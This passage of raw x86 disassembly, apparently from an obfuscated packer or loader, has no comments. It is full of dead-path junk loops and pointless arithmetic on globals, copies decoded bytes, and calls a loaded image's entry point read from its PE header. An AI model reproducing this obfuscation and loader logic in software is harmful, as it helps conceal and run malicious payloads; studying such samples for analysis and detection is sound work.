  41bace:	xor    edi,DWORD PTR ds:0x42b008
  41bad4:	add    edi,DWORD PTR ds:0x42800c
  41bada:	mov    DWORD PTR ds:0x42b008,edi
  41bae0:	mov    DWORD PTR [ebp-0x3c],eax
  41bae3:	lea    eax,[ebp-0x48]
  41bae6:	or     edi,esi
  41bae8:	mov    DWORD PTR [ebp-0x24],eax
  41baeb:	mov    eax,ds:0x421c66
  41baf0:	adc    DWORD PTR ds:0x428014,ebx
  41baf6:	mov    eax,DWORD PTR [eax+0x1c8]
  41bafc:	and    DWORD PTR ds:0x42a01c,0x0
  41bb06:	jmp    0x41bb18
  41bb0b:	mov    edi,DWORD PTR ds:0x42a01c
  41bb11:	inc    edi
  41bb12:	mov    DWORD PTR ds:0x42a01c,edi
  41bb18:	cmp    DWORD PTR ds:0x42a01c,0x1f
  41bb1f:	jae    0x41bb48
  41bb25:	cmp    DWORD PTR ds:0x42a01c,0x2a
  41bb2c:	jne    0x41bb43
  41bb32:	push   DWORD PTR [ebp-0x24]
  41bb35:	push   DWORD PTR [ebp-0x1c]
  41bb38:	push   0x27cc
  41bb3d:	call   DWORD PTR ds:0x424028
  41bb43:	jmp    0x41bb0b
  41bb48:	mov    eax,DWORD PTR [eax]
  41bb4a:	xor    esi,esi
  41bb4c:	or     esi,DWORD PTR ds:0x429000
  41bb52:	adc    DWORD PTR ds:0x429014,esi
  41bb58:	mov    ecx,DWORD PTR [ebp-0x24]
  41bb5b:	mov    esi,0x7510893
  41bb60:	mov    edi,DWORD PTR ds:0x429010
  41bb66:	or     edi,DWORD PTR ds:0x42a01c
  41bb6c:	mov    DWORD PTR ds:0x429010,edi
  41bb72:	xor    eax,esi
  41bb74:	movzx  edi,BYTE PTR ds:0x42a014
  41bb7b:	adc    edi,DWORD PTR ds:0x42a004
  41bb81:	mov    DWORD PTR ds:0x42a014,edi
  41bb87:	mov    edi,0x3272db
  41bb8c:	add    DWORD PTR ds:0x428000,0x429004
  41bb96:	add    eax,edi
  41bb98:	mov    DWORD PTR ds:0x428000,0xa07
  41bba2:	mov    DWORD PTR [ecx],eax
  41bba4:	mov    eax,0x1dcc
  41bba9:	mov    eax,ds:0x421e82
  41bbae:	cmp    eax,0x301ac8f5
  41bbb3:	mov    DWORD PTR ds:0x42a01c,0x9b1
  41bbbd:	jne    0x41bc4c
  41bbc3:	or     ecx,DWORD PTR ds:0x42b014
  41bbc9:	mov    eax,DWORD PTR [ebp-0x4]
  41bbcc:	dec    DWORD PTR ds:0x429000
  41bbd2:	mov    ecx,DWORD PTR ds:0x421c66
  41bbd8:	adc    DWORD PTR ds:0x42a004,ebx
  41bbde:	mov    ecx,DWORD PTR [ecx+0x198]
  41bbe4:	add    ebx,DWORD PTR ds:0x428014
  41bbea:	xor    eax,esi
  41bbec:	sbb    ebx,DWORD PTR ds:0x429010
  41bbf2:	add    eax,edi
  41bbf4:	mov    DWORD PTR [ecx],eax
  41bbf6:	and    DWORD PTR ds:0x428000,0x0
  41bc00:	xor    eax,eax
  41bc02:	add    eax,DWORD PTR ds:0x428000
  41bc08:	inc    eax
  41bc09:	mov    ds:0x428000,eax
  41bc0e:	cmp    DWORD PTR ds:0x428000,0x23
  41bc15:	jne    0x41bc2b
  41bc1b:	push   0x42385f
  41bc20:	push   0x423893
  41bc25:	call   DWORD PTR ds:0x424030
  41bc2b:	cmp    DWORD PTR ds:0x428000,0x17
  41bc32:	jb     0x41bc00
  41bc38:	mov    eax,DWORD PTR [ebp-0x4]
  41bc3b:	and    DWORD PTR ds:0x42a018,edx
  41bc41:	xor    eax,esi
  41bc43:	xor    ebx,ebx
  41bc45:	add    eax,edi
  41bc47:	mov    ds:0x421e82,eax
  41bc4c:	sub    eax,eax
  41bc4e:	mov    eax,ds:0x421c66
  41bc53:	adc    DWORD PTR ds:0x42b018,0x29cb
  41bc5d:	mov    eax,DWORD PTR [eax+0x18c]
  41bc63:	and    DWORD PTR ds:0x42a004,0x0
  41bc6d:	mov    ebx,DWORD PTR ds:0x42a004
  41bc73:	inc    ebx
  41bc74:	mov    DWORD PTR ds:0x42a004,ebx
  41bc7a:	cmp    DWORD PTR ds:0x42a004,0x13
  41bc81:	jne    0x41bca9
  41bc87:	push   0x49d6
  41bc8c:	push   0x649f
  41bc91:	push   DWORD PTR [ebp-0x20]
  41bc94:	push   0x2fe7
  41bc99:	push   0x2c94
  41bc9e:	push   0x42c018
  41bca3:	call   DWORD PTR ds:0x424038
  41bca9:	cmp    DWORD PTR ds:0x42a004,0x11
  41bcb0:	jb     0x41bc6d
  41bcb6:	xor    ecx,ecx
  41bcb8:	xor    ecx,DWORD PTR ds:0x42b004
  41bcbe:	sbb    ecx,DWORD PTR ds:0x42a008
  41bcc4:	mov    DWORD PTR ds:0x42b004,ecx
  41bcca:	mov    eax,DWORD PTR [eax]
  41bccc:	and    DWORD PTR ds:0x429004,0x0
  41bcd6:	xor    ecx,ecx
  41bcd8:	xor    ecx,DWORD PTR ds:0x429004
  41bcde:	inc    ecx
  41bcdf:	mov    DWORD PTR ds:0x429004,ecx
  41bce5:	cmp    DWORD PTR ds:0x429004,0xe
  41bcec:	jne    0x41bd02
  41bcf2:	push   0x42c014
  41bcf7:	push   0x2d10
  41bcfc:	call   DWORD PTR ds:0x42403c
  41bd02:	cmp    DWORD PTR ds:0x429004,0xd
  41bd09:	jne    0x41bd1c
  41bd0f:	mov    ecx,DWORD PTR ds:0x429004
  41bd15:	inc    ecx
  41bd16:	mov    DWORD PTR ds:0x429004,ecx
  41bd1c:	cmp    DWORD PTR ds:0x429004,0x1a
  41bd23:	jb     0x41bcd6
  41bd29:	or     ecx,ecx
  41bd2b:	mov    DWORD PTR [ebp-0x4c],eax
  41bd2e:	mov    ecx,0xf89c85ba
  41bd33:	sub    ebx,DWORD PTR ds:0x42c000
  41bd39:	mov    DWORD PTR [ebp-0x38],ecx
  41bd3c:	and    DWORD PTR ds:0x428024,edx
  41bd42:	mov    DWORD PTR [ebp-0x38],ecx
  41bd45:	and    DWORD PTR ds:0x42c014,0x0
  41bd4f:	mov    ebx,DWORD PTR ds:0x42c014
  41bd55:	inc    ebx
  41bd56:	mov    DWORD PTR ds:0x42c014,ebx
  41bd5c:	cmp    DWORD PTR ds:0x42c014,0x10
  41bd63:	jne    0x41bd77
  41bd69:	push   DWORD PTR [ebp-0x10]
  41bd6c:	push   0x4238de
  41bd71:	call   DWORD PTR ds:0x424040
  41bd77:	cmp    DWORD PTR ds:0x42c014,0xf
  41bd7e:	jne    0x41bd91
  41bd84:	mov    ebx,DWORD PTR ds:0x42c014
  41bd8a:	inc    ebx
  41bd8b:	mov    DWORD PTR ds:0x42c014,ebx
  41bd91:	cmp    DWORD PTR ds:0x42c014,0x1f
  41bd98:	jb     0x41bd4f
  41bd9e:	sub    eax,eax
  41bda0:	mov    DWORD PTR [ebp-0x38],ecx
  41bda3:	or     DWORD PTR ds:0x429014,0x293b
  41bdad:	mov    DWORD PTR [ebp-0x30],edx
  41bdb0:	sub    edx,0x44be
  41bdb6:	mov    DWORD PTR [ebp-0x38],ecx
  41bdb9:	add    eax,DWORD PTR ds:0x428000
  41bdbf:	mov    DWORD PTR [ebp-0x38],0xf89c85be
  41bdc6:	mov    eax,DWORD PTR [ebp-0x4]
  41bdc9:	movzx  edx,WORD PTR ds:0x428020
  41bdd0:	add    DWORD PTR ds:0x42b00c,edx
  41bdd6:	mov    edx,DWORD PTR [ebp-0x8]
  41bdd9:	adc    ebx,0x414f
  41bddf:	mov    ebx,DWORD PTR [ebp-0x8]
  41bde2:	xor    ebx,esi
  41bde4:	and    DWORD PTR ds:0x42c018,0x42a004
  41bdee:	xor    edx,esi
  41bdf0:	add    edx,ebx
  41bdf2:	movzx  ebx,BYTE PTR ds:0x42a01c
  41bdf9:	and    DWORD PTR ds:0x429018,ebx
  41bdff:	mov    ebx,DWORD PTR [ebp-0x8]
  41be02:	xor    ebx,esi
  41be04:	xor    DWORD PTR ds:0x428028,0x1d40
  41be0e:	xor    eax,esi
  41be10:	sbb    DWORD PTR ds:0x42a008,0x42a018
  41be1a:	add    eax,edi
  41be1c:	lea    edx,[edx+ebx*1+0x975891]
  41be23:	mov    ebx,0x7216
  41be28:	mov    DWORD PTR [ebp-0x14],eax
  41be2b:	mov    ebx,0x8a29a123
  41be30:	mov    DWORD PTR ds:0x429018,0x7968
  41be3a:	cmp    eax,edx
  41be3c:	ja     0x41c14b
  41be42:	mov    DWORD PTR ds:0x42a008,0x16
  41be4c:	cmp    DWORD PTR ds:0x42a008,0x0
  41be53:	je     0x41bea1
  41be59:	cmp    DWORD PTR ds:0x42a008,0xa
  41be60:	jne    0x41be71
  41be66:	push   0x423893
  41be6b:	call   DWORD PTR ds:0x424044
  41be71:	cmp    DWORD PTR ds:0x42a008,0xb
  41be78:	jne    0x41be8d
  41be7e:	xor    ecx,ecx
  41be80:	xor    ecx,DWORD PTR ds:0x42a008
  41be86:	dec    ecx
  41be87:	mov    DWORD PTR ds:0x42a008,ecx
  41be8d:	xor    ecx,ecx
  41be8f:	add    ecx,DWORD PTR ds:0x42a008
  41be95:	dec    ecx
  41be96:	mov    DWORD PTR ds:0x42a008,ecx
  41be9c:	jmp    0x41be4c
  41bea1:	mov    ecx,DWORD PTR [ebp-0x8]
  41bea4:	xor    ecx,esi
  41bea6:	lea    ecx,[ecx+eax*1+0x3272db]
  41bead:	or     DWORD PTR ds:0x429014,0x429018
  41beb7:	mov    DWORD PTR [ebp-0x10],ecx
  41beba:	mov    ecx,DWORD PTR [ebp-0x30]
  41bebd:	xor    ecx,esi
  41bebf:	adc    edx,0x7be1
  41bec5:	lea    ecx,[ebp+ecx*1+0x3272e3]
  41becc:	add    DWORD PTR ds:0x42b00c,0x3739
  41bed6:	mov    DWORD PTR [ebp-0x38],ecx
  41bed9:	and    DWORD PTR ds:0x429010,0x0
  41bee3:	mov    edx,DWORD PTR ds:0x429010
  41bee9:	inc    edx
  41beea:	mov    DWORD PTR ds:0x429010,edx
  41bef0:	cmp    DWORD PTR ds:0x429010,0x21
  41bef7:	jne    0x41bf12
  41befd:	push   0x1770
  41bf02:	push   0x42c01c
  41bf07:	push   0x423956
  41bf0c:	call   DWORD PTR ds:0x424048
  41bf12:	cmp    DWORD PTR ds:0x429010,0x1b
  41bf19:	jb     0x41bee3
  41bf1f:	mov    ecx,DWORD PTR ds:0x421c66
  41bf25:	mov    ecx,DWORD PTR [ecx+0x1bc]
  41bf2b:	and    DWORD PTR ds:0x42900c,0x0
  41bf35:	jmp    0x41bf47
  41bf3a:	mov    edx,DWORD PTR ds:0x42900c
  41bf40:	inc    edx
  41bf41:	mov    DWORD PTR ds:0x42900c,edx
  41bf47:	cmp    DWORD PTR ds:0x42900c,0x19
  41bf4e:	jae    0x41bf96
  41bf54:	cmp    DWORD PTR ds:0x42900c,0xa
  41bf5b:	jne    0x41bf6f
  41bf61:	push   0x42900c
  41bf66:	push   DWORD PTR [ebp-0x28]
  41bf69:	call   DWORD PTR ds:0x424014
  41bf6f:	cmp    DWORD PTR ds:0x42900c,0x9
  41bf76:	jne    0x41bf8b
  41bf7c:	xor    edx,edx
  41bf7e:	or     edx,DWORD PTR ds:0x42900c
  41bf84:	inc    edx
  41bf85:	mov    DWORD PTR ds:0x42900c,edx
  41bf8b:	jmp    0x41bf3a
  41bf90:	adc    edx,DWORD PTR ds:0x42b00c
  41bf96:	mov    DWORD PTR [ebp-0xc],0xf89c85b6
  41bf9d:	and    DWORD PTR ds:0x42b00c,0x0
  41bfa7:	jmp    0x41bfbb
  41bfac:	xor    edx,edx
  41bfae:	xor    edx,DWORD PTR ds:0x42b00c
  41bfb4:	inc    edx
  41bfb5:	mov    DWORD PTR ds:0x42b00c,edx
  41bfbb:	cmp    DWORD PTR ds:0x42b00c,0x10
  41bfc2:	jae    0x41c020
  41bfc8:	cmp    DWORD PTR ds:0x42b00c,0x5
  41bfcf:	jne    0x41bfff
  41bfd5:	push   0x33b5
  41bfda:	push   0x42b014
  41bfdf:	push   0x1dc5
  41bfe4:	push   0x42801c
  41bfe9:	push   DWORD PTR [ebp-0x14]
  41bfec:	push   0x39d8
  41bff1:	push   DWORD PTR [ebp-0x14]
  41bff4:	push   0x8914
  41bff9:	call   DWORD PTR ds:0x424018
  41bfff:	cmp    DWORD PTR ds:0x42b00c,0x4
  41c006:	jne    0x41c01b
  41c00c:	xor    edx,edx
  41c00e:	xor    edx,DWORD PTR ds:0x42b00c
  41c014:	inc    edx
  41c015:	mov    DWORD PTR ds:0x42b00c,edx
  41c01b:	jmp    0x41bfac
  41c020:	mov    DWORD PTR [ebp-0x34],ecx
  41c023:	and    DWORD PTR ds:0x42b01c,0x11ac
  41c02d:	mov    DWORD PTR [ebp-0x20],0xf89c85b5
  41c034:	sub    ecx,ecx
  41c036:	mov    ecx,DWORD PTR [ebp-0xc]
  41c039:	or     edx,DWORD PTR ds:0x428018
  41c03f:	mov    edx,DWORD PTR [ebp-0x10]
  41c042:	xor    ecx,esi
  41c044:	add    ecx,edi
  41c046:	cmp    ecx,edx
  41c048:	je     0x41c117
  41c04e:	mov    eax,DWORD PTR [ebp-0xc]
  41c051:	mov    ecx,DWORD PTR [ebp-0x10]
  41c054:	xor    edx,edx
  41c056:	xor    eax,esi
  41c058:	add    eax,edi
  41c05a:	add    ecx,0xfabdbef1
  41c060:	adc    edx,0xffffffff
  41c063:	xor    ecx,ebx
  41c065:	xor    edx,0x0
  41c068:	mov    DWORD PTR [ebp-0x68],ecx
  41c06b:	mov    DWORD PTR [ebp-0x64],edx
  41c06e:	xor    edx,edx
  41c070:	mov    ecx,eax
  41c072:	add    ecx,0xfabdbef1
  41c078:	adc    edx,0xffffffff
  41c07b:	xor    ecx,ebx
  41c07d:	xor    edx,0x0
  41c080:	mov    DWORD PTR [ebp-0x24],eax
  41c083:	mov    DWORD PTR [ebp-0x74],edx
  41c086:	cmp    ecx,DWORD PTR [ebp-0x68]
  41c089:	jne    0x41c09a
  41c08f:	mov    ecx,DWORD PTR [ebp-0x64]
  41c092:	cmp    edx,ecx
  41c094:	je     0x41c114
  41c09a:	mov    ecx,DWORD PTR [ebp-0xc]
  41c09d:	mov    edx,DWORD PTR [ebp-0x20]
  41c0a0:	xor    edx,esi
  41c0a2:	add    edx,edi
  41c0a4:	imul   edx,eax
  41c0a7:	xor    ecx,esi
  41c0a9:	add    ecx,eax
  41c0ab:	mov    eax,DWORD PTR [ebp-0x34]
  41c0ae:	mov    ebx,DWORD PTR [ebp-0x38]
  41c0b1:	mov    cl,BYTE PTR [ebx+ecx*1+0x3272db]
  41c0b8:	mov    BYTE PTR [edx+eax*1],cl
  41c0bb:	mov    eax,DWORD PTR [ebp-0x20]
  41c0be:	mov    ecx,DWORD PTR [ebp-0x24]
  41c0c1:	xor    eax,esi
  41c0c3:	lea    eax,[ecx+eax*1+0x3272db]
  41c0ca:	mov    ecx,DWORD PTR [ebp-0x10]
  41c0cd:	xor    edx,edx
  41c0cf:	add    ecx,0xfabdbef1
  41c0d5:	adc    edx,0xffffffff
  41c0d8:	xor    edx,0x0
  41c0db:	mov    ebx,0x8a29a123
  41c0e0:	xor    ecx,ebx
  41c0e2:	mov    DWORD PTR [ebp-0x70],ecx
  41c0e5:	mov    DWORD PTR [ebp-0x6c],edx
  41c0e8:	xor    edx,edx
  41c0ea:	mov    ecx,eax
  41c0ec:	add    ecx,0xfabdbef1
  41c0f2:	adc    edx,0xffffffff
  41c0f5:	xor    ecx,ebx
  41c0f7:	xor    edx,0x0
  41c0fa:	mov    DWORD PTR [ebp-0x24],eax
  41c0fd:	mov    DWORD PTR [ebp-0x7c],edx
  41c100:	cmp    ecx,DWORD PTR [ebp-0x70]
  41c103:	jne    0x41c09a
  41c109:	mov    ecx,DWORD PTR [ebp-0x6c]
  41c10c:	cmp    edx,ecx
  41c10e:	jne    0x41c09a
  41c114:	mov    eax,DWORD PTR [ebp-0x14]
  41c117:	mov    ecx,DWORD PTR [ebp-0x8]
  41c11a:	xor    ecx,esi
  41c11c:	lea    eax,[eax+ecx*1+0x3272db]
  41c123:	mov    ecx,DWORD PTR [ebp-0x8]
  41c126:	mov    edx,DWORD PTR [ebp-0x8]
  41c129:	xor    edx,esi
  41c12b:	xor    ecx,esi
  41c12d:	add    ecx,edx
  41c12f:	mov    edx,DWORD PTR [ebp-0x8]
  41c132:	xor    edx,esi
  41c134:	lea    ecx,[ecx+edx*1+0x975891]
  41c13b:	mov    DWORD PTR [ebp-0x14],eax
  41c13e:	cmp    eax,ecx
  41c140:	jbe    0x41be42
  41c146:	mov    ecx,0xf89c85ba
  41c14b:	mov    eax,DWORD PTR [ebp+0xc]
  41c14e:	mov    ds:0x421aea,eax
  41c153:	mov    eax,DWORD PTR [ebp+0x10]
  41c156:	mov    ds:0x421d3e,eax
  41c15b:	mov    eax,ds:0x421aea
  41c160:	mov    edx,DWORD PTR [ebp-0x3c]
  41c163:	sub    eax,edi
  41c165:	xor    eax,esi
  41c167:	mov    DWORD PTR [edx],eax
  41c169:	mov    eax,DWORD PTR [ebp-0x18]
  41c16c:	cmp    eax,0xf89c85b6
  41c171:	jne    0x41c19c
  41c177:	lea    eax,[ebp-0x28]
  41c17a:	mov    DWORD PTR [ebp-0x40],eax
  41c17d:	lea    eax,[ebp+0x4]
  41c180:	mov    DWORD PTR [ebp-0x28],eax
  41c183:	mov    eax,DWORD PTR [ebp-0x28]
  41c186:	test   eax,eax
  41c188:	je     0x41c2b4
  41c18e:	mov    eax,DWORD PTR [ebp-0x1c]
  41c191:	mov    eax,DWORD PTR [ebp-0x8]
  41c194:	lea    eax,[ebp-0x40]
  41c197:	jmp    0x41c2ab
  41c19c:	mov    eax,DWORD PTR [ebp-0x44]
  41c19f:	cmp    eax,0xf89c85b5
  41c1a4:	je     0x41c201
  41c1aa:	mov    eax,DWORD PTR [ebp-0x4]
  41c1ad:	mov    edx,DWORD PTR [ebp-0x48]
  41c1b0:	xor    eax,esi
  41c1b2:	add    eax,edi
  41c1b4:	cmp    eax,edx
  41c1b6:	je     0x41c201
  41c1bc:	mov    eax,ds:0x421c66
  41c1c1:	mov    eax,DWORD PTR [eax+0x194]
  41c1c7:	mov    ecx,DWORD PTR [eax]
  41c1c9:	mov    eax,DWORD PTR [ecx+0x3c]
  41c1cc:	push   DWORD PTR ds:0x421d3e
  41c1d2:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  41c1d6:	push   DWORD PTR ds:0x421aea
  41c1dc:	add    eax,ecx
  41c1de:	mov    ecx,DWORD PTR ds:0x421c66
  41c1e4:	mov    ecx,DWORD PTR [ecx+0x194]
  41c1ea:	push   DWORD PTR [ecx]
  41c1ec:	call   eax
  41c1ee:	mov    ecx,DWORD PTR ds:0x421c66
  41c1f4:	mov    ecx,DWORD PTR [ecx+0x1cc]
  41c1fa:	mov    DWORD PTR [ecx],eax
  41c1fc:	jmp    0x41c2b4
  41c201:	mov    eax,DWORD PTR [ebp-0x4]
  41c204:	mov    edx,DWORD PTR [ebp-0x4c]
  41c207:	xor    eax,esi
  41c209:	add    eax,edi
  41c20b:	cmp    eax,edx
  41c20d:	jne    0x41c26a
  41c213:	mov    eax,DWORD PTR [ebp-0x4]
  41c216:	mov    edx,DWORD PTR ds:0x421c66
  41c21c:	mov    edx,DWORD PTR [edx+0x198]
  41c222:	xor    eax,esi
  41c224:	add    eax,edi
  41c226:	cmp    eax,DWORD PTR [edx]
  41c228:	jne    0x41c247
  41c22e:	mov    eax,DWORD PTR [ebp-0x4]
  41c231:	push   0xf89c85b6
  41c236:	xor    eax,esi
  41c238:	add    eax,edi
  41c23a:	push   eax
  41c23b:	push   ecx
  41c23c:	push   DWORD PTR [ebp-0x8]
  41c23f:	push   DWORD PTR [ebp-0x4]
  41c242:	call   0x413d37
  41c247:	push   DWORD PTR [ebp-0x8]
  41c24a:	push   DWORD PTR [ebp-0x4]
  41c24d:	call   0x41af10
  41c252:	mov    eax,DWORD PTR [ebp-0x4]
  41c255:	xor    eax,esi
  41c257:	add    eax,edi
  41c259:	mov    ds:0x421cea,eax
  41c25e:	mov    eax,DWORD PTR [ebp-0x4]
  41c261:	xor    eax,esi
  41c263:	add    eax,edi
  41c265:	mov    ds:0x421ce2,eax
  41c26a:	lea    eax,[ebp-0x2c]
  41c26d:	mov    DWORD PTR [ebp-0x50],eax
  41c270:	lea    eax,[ebp+0x4]
  41c273:	mov    DWORD PTR [ebp-0x2c],eax
  41c276:	mov    eax,DWORD PTR [ebp-0x2c]
  41c279:	test   eax,eax
  41c27b:	je     0x41c2b4
  41c281:	mov    DWORD PTR [ebp-0x54],0xf152c3d
  41c288:	mov    DWORD PTR [ebp-0x58],0x712ed08
  41c28f:	mov    DWORD PTR [ebp-0x5c],0x373fc2e
  41c296:	mov    DWORD PTR [ebp-0x60],0x72670a1e
  41c29d:	call   0x401000
  41c2a2:	mov    eax,DWORD PTR [ebp-0x1c]
  41c2a5:	mov    eax,DWORD PTR [ebp-0x8]
  41c2a8:	lea    eax,[ebp-0x50]
  41c2ab:	push   eax
  41c2ac:	push   DWORD PTR [ebp-0x4]
  41c2af:	call   0x40cf5e
  41c2b4:	mov    eax,ds:0x421c66
  41c2b9:	add    eax,0x1cc
  41c2be:	mov    DWORD PTR [ebp-0x38],eax
  41c2c1:	lea    eax,[ebp-0x1c]
  41c2c4:	mov    DWORD PTR [ebp+0xc],0xf89c85b6
  41c2cb:	mov    DWORD PTR [ebp-0x3c],eax
  41c2ce:	mov    DWORD PTR [ebp-0x24],0xf89c85b5
  41c2d5:	mov    eax,DWORD PTR [ebp+0xc]
  41c2d8:	xor    eax,esi
  41c2da:	mov    DWORD PTR [ebp+0x10],0x4
  41c2e1:	mov    ecx,DWORD PTR [ebp+0x10]
  41c2e4:	add    eax,edi
  41c2e6:	cmp    eax,ecx
  41c2e8:	je     0x41c3a9
  41c2ee:	mov    eax,DWORD PTR [ebp+0xc]
  41c2f1:	mov    ecx,DWORD PTR [ebp+0x10]
  41c2f4:	xor    edx,edx
  41c2f6:	xor    eax,esi
  41c2f8:	add    eax,edi
  41c2fa:	add    ecx,0xfabdbef1
  41c300:	adc    edx,0xffffffff
  41c303:	xor    ecx,ebx
  41c305:	xor    edx,0x0
  41c308:	mov    DWORD PTR [ebp-0x70],ecx
  41c30b:	mov    DWORD PTR [ebp-0x6c],edx
  41c30e:	xor    edx,edx
  41c310:	mov    ecx,eax
  41c312:	add    ecx,0xfabdbef1
  41c318:	adc    edx,0xffffffff
  41c31b:	xor    ecx,ebx
  41c31d:	xor    edx,0x0
  41c320:	mov    DWORD PTR [ebp-0x20],eax
  41c323:	cmp    ecx,DWORD PTR [ebp-0x70]
  41c326:	jne    0x41c335
  41c32c:	cmp    edx,DWORD PTR [ebp-0x6c]
  41c32f:	je     0x41c3a9
  41c335:	mov    ecx,DWORD PTR [ebp+0xc]
  41c338:	mov    edx,DWORD PTR [ebp-0x24]
  41c33b:	xor    edx,esi
  41c33d:	xor    ecx,esi
  41c33f:	add    ecx,eax
  41c341:	add    edx,edi
  41c343:	imul   edx,eax
  41c346:	mov    eax,DWORD PTR [ebp-0x3c]
  41c349:	mov    ebx,DWORD PTR [ebp-0x38]
  41c34c:	mov    cl,BYTE PTR [ebx+ecx*1+0x3272db]
  41c353:	mov    BYTE PTR [edx+eax*1],cl
  41c356:	mov    eax,DWORD PTR [ebp-0x24]
  41c359:	mov    ecx,DWORD PTR [ebp-0x20]
  41c35c:	mov    edx,DWORD PTR [ebp+0x10]
  41c35f:	xor    eax,esi
  41c361:	lea    eax,[ecx+eax*1+0x3272db]
  41c368:	xor    ecx,ecx
  41c36a:	add    edx,0xfabdbef1
  41c370:	adc    ecx,0xffffffff
  41c373:	xor    ecx,0x0
  41c376:	mov    DWORD PTR [ebp-0x7c],ecx
  41c379:	xor    ebx,ebx
  41c37b:	xor    edx,0x8a29a123
  41c381:	mov    ecx,eax
  41c383:	add    ecx,0xfabdbef1
  41c389:	adc    ebx,0xffffffff
  41c38c:	xor    ecx,0x8a29a123
  41c392:	xor    ebx,0x0
  41c395:	mov    DWORD PTR [ebp-0x20],eax
  41c398:	cmp    ecx,edx
  41c39a:	jne    0x41c335
  41c3a0:	cmp    ebx,DWORD PTR [ebp-0x7c]
  41c3a3:	jne    0x41c335
  41c3a9:	mov    eax,DWORD PTR [ebp-0x1c]
  41c3ac:	mov    eax,DWORD PTR [eax]
  41c3ae:	pop    edi
  41c3af:	pop    esi
  41c3b0:	pop    ebx
  41c3b1:	leave  
  41c3b2:	ret    0xc
  41c3b5:	push   ebp
  41c3b6:	mov    ebp,esp
  41c3b8:	sub    esp,0xa4
  41c3be:	mov    ecx,DWORD PTR [ebp+0x8]
  41c3c1:	and    DWORD PTR ds:0x42a01c,0x0
  41c3cb:	jmp    0x41c3db
  41c3d0:	mov    eax,ds:0x42a01c
  41c3d5:	inc    eax
  41c3d6:	mov    ds:0x42a01c,eax
  41c3db:	cmp    DWORD PTR ds:0x42a01c,0x17
  41c3e2:	jae    0x41c404
  41c3e8:	cmp    DWORD PTR ds:0x42a01c,0x25
  41c3ef:	jne    0x41c3fe
  41c3f5:	push   DWORD PTR [ebp-0x14]
  41c3f8:	call   DWORD PTR ds:0x42401c
  41c3fe:	jmp    0x41c3d0
  41c403:	inc    eax
  41c404:	mov    eax,0x8a85
  41c409:	sub    DWORD PTR ds:0x42a008,0x36bb
  41c413:	xor    ax,WORD PTR [ecx+0x20]
  41c417:	mov    DWORD PTR ds:0x42c018,0x1e
  41c421:	cmp    DWORD PTR ds:0x42c018,0x0
  41c428:	je     0x41c465
  41c42e:	cmp    DWORD PTR ds:0x42c018,0x25
  41c435:	jne    0x41c449
  41c43b:	push   DWORD PTR [ebp-0x10]
  41c43e:	push   0x3dbe
  41c443:	call   DWORD PTR ds:0x424020
  41c449:	mov    ecx,DWORD PTR ds:0x42c018
  41c44f:	dec    ecx
  41c450:	mov    DWORD PTR ds:0x42c018,ecx
  41c456:	jmp    0x41c421
  41c45b:	sub    DWORD PTR ds:0x428014,0x2577
  41c465:	mov    ecx,0x3b4b
  41c46a:	xor    DWORD PTR ds:0x42b00c,0x43e8
  41c474:	add    ax,cx
  41c477:	mov    DWORD PTR ds:0x429004,0x1e
  41c481:	cmp    DWORD PTR ds:0x429004,0x0
  41c488:	je     0x41c4e7
  41c48e:	cmp    DWORD PTR ds:0x429004,0x2c
  41c495:	jne    0x41c4c5
  41c49b:	push   0x42c000
  41c4a0:	push   0x3d75
  41c4a5:	push   DWORD PTR [ebp-0x20]
  41c4a8:	push   0x42c004
  41c4ad:	push   DWORD PTR [ebp-0xc]
  41c4b0:	push   0x4237f2
  41c4b5:	push   0x75d0
  41c4ba:	push   0x7026
  41c4bf:	call   DWORD PTR ds:0x424024
  41c4c5:	xor    ecx,ecx
  41c4c7:	add    ecx,DWORD PTR ds:0x429004
  41c4cd:	dec    ecx
  41c4ce:	mov    DWORD PTR ds:0x429004,ecx
  41c4d4:	jmp    0x41c481
  41c4d9:	mov    ecx,DWORD PTR ds:0x421a96
  41c4df:	mov    ecx,DWORD PTR [ecx]
  41c4e1:	and    DWORD PTR ds:0x428024,ecx
  41c4e7:	movzx  eax,ax
  41c4ea:	xor    DWORD PTR ds:0x42a004,0x42801c
  41c4f4:	mov    DWORD PTR [ebp-0x18],eax
  41c4f7:	and    DWORD PTR ds:0x42801c,0x7f28
  41c501:	mov    BYTE PTR [ebp-0x1],0x61
  41c505:	xor    ecx,0x4092
  41c50b:	lea    eax,[ebp-0x1]
  41c50e:	sub    DWORD PTR ds:0x429008,0x31e1
  41c518:	mov    DWORD PTR [ebp-0x10],eax
  41c51b:	add    ecx,DWORD PTR ds:0x428010
  41c521:	mov    al,BYTE PTR [ebp-0x1]
  41c524:	and    ecx,0x7ba8
  41c52a:	mov    ecx,DWORD PTR [ebp-0x10]
  41c52d:	xor    al,0x6f
  41c52f:	and    DWORD PTR ds:0x428008,0x42b018
  41c539:	sub    al,0xd
  41c53b:	adc    DWORD PTR ds:0x428018,0x42b008
  41c545:	mov    BYTE PTR [ecx],al
  41c547:	add    DWORD PTR ds:0x42a01c,ecx
  41c54d:	mov    DWORD PTR [ebp-0x14],0xf89c85b6
  41c554:	mov    DWORD PTR ds:0x42a010,0x1c
  41c55e:	cmp    DWORD PTR ds:0x42a010,0x0
  41c565:	je     0x41c5a5
  41c56b:	cmp    DWORD PTR ds:0x42a010,0x2c
  41c572:	jne    0x41c58b
  41c578:	push   0x5aa3
  41c57d:	push   0x697d
  41c582:	push   DWORD PTR [ebp-0x28]
  41c585:	call   DWORD PTR ds:0x424028
  41c58b:	xor    ecx,ecx
  41c58d:	add    ecx,DWORD PTR ds:0x42a010
  41c593:	dec    ecx
  41c594:	mov    DWORD PTR ds:0x42a010,ecx
  41c59a:	jmp    0x41c55e
  41c59f:	sbb    DWORD PTR ds:0x42a000,ebx
  41c5a5:	push   ebx
  41c5a6:	sbb    eax,ecx
  41c5a8:	mov    DWORD PTR [ebp-0x8],0xf89c85b5
  41c5af:	and    DWORD PTR ds:0x428020,0x0
  41c5b9:	jmp    0x41c5cb
  41c5be:	mov    ecx,DWORD PTR ds:0x428020
  41c5c4:	inc    ecx
  41c5c5:	mov    DWORD PTR ds:0x428020,ecx
  41c5cb:	cmp    DWORD PTR ds:0x428020,0x19
  41c5d2:	jae    0x41c5fa
  41c5d8:	cmp    DWORD PTR ds:0x428020,0x28
  41c5df:	jne    0x41c5f5
  41c5e5:	push   0x423948
  41c5ea:	push   0x4238ad
  41c5ef:	call   DWORD PTR ds:0x424030
  41c5f5:	jmp    0x41c5be
  41c5fa:	mov    ecx,DWORD PTR [ebp-0x14]
  41c5fd:	push   esi
